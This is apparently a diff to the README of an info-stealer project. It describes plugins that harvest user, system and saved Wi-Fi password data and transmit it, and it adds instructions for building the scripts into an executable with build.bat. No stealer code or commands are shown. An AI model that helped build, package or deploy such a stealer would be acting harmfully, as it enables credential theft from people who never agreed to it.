@@ -29,7 +29,7 @@
 - **Cleanup**: Deletes temporary files after data transmission to maintain privacy.
 - **GUI Integration**: Provides a user-friendly interface for setting up and running data extraction tasks.
   
-  ![Image Description](images/ui.png)   ![Image Description](images/ui2.png)
+  ![Image Description](images/ui.png)   ![Image Description](images/ui2.png) ![Image Description](images/ui2.png) 
 
 ## Use Cases
 
@@ -38,6 +38,8 @@
 - **Educational Purposes**: Helps developers understand how local data can be accessed and the importance of securing sensitive information.
 
 > **Warning:** This tool is intended for educational purposes and ethical use only. Unauthorized use of this tool on systems you do not own or have explicit permission to test is illegal and unethical.
+
+## File Structure
 
 ## File Structure
 
@@ -58,6 +60,7 @@ S124-Info-Stealers/
 ├── env_manager.py    
 │
 ├── requirements.txt 
+├── build.bat                 # Batch file to build an executable
 └── README.md                 # This readme file
 ```
 
@@ -69,6 +72,7 @@ S124-Info-Stealers/
 - **`plugins/steal_user.py`**: Script for gathering user and system details.
 - **`plugins/wifi_passwords.py`**: Script for retrieving saved Wi-Fi passwords.
 - **`main.py`**: The main script that executes the functions from the plugins.
+- **`build.bat`**: A batch file for creating an executable version of the script.
 
 ## Installation
 
@@ -102,6 +106,16 @@ python main.py
 ```
 
 This will execute all the extraction functions and handle data transmission according to your configuration.
+
+## Building Executable
+
+To create an executable version of the script, use the `build.bat` file included in the project. Run the following command in the command prompt:
+
+```sh
+build.bat
+```
+
+This will generate an executable file from the Python scripts.
 
 ## Configuration
 
